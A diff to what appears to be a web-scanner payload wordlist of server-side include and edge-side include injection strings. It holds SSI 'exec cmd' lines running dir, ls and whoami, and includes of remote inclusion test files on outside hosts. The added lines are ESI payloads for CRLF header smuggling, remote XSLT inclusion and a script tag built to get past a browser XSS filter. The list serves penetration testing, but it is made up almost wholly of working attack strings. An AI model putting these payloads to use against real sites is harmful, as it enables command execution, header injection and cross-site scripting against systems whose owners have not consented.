@@ -76,11 +76,17 @@
 <!--#fsize file="ssi.shtml" -->
 <!--#include file=?UUUUUUUU...UU?-->
 <!--#include virtual="/" -->
+<!--#include virtual="/index.html" -->
 <!--#include virtual="http://sn1persecurity.com/.testing/rfi_vuln.php" -->
 <!--#include virtual="https://crowdshield.com/.testing/rfi_vuln.php" -->
 <!--#printenv -->
 </nowiki>
+<esi:debug/>
+<esi:include src="http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://google.com/poc.xsl" />
+<esi:include src=http://google.com/>
 <pre><!--#echo var="DATE_LOCAL" --> </pre>
 <pre><!--#exec cmd="dir" --></pre>
 <pre><!--#exec cmd="ls" --></pre>
 <pre><!--#exec cmd="whoami"--></pre>
+x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>
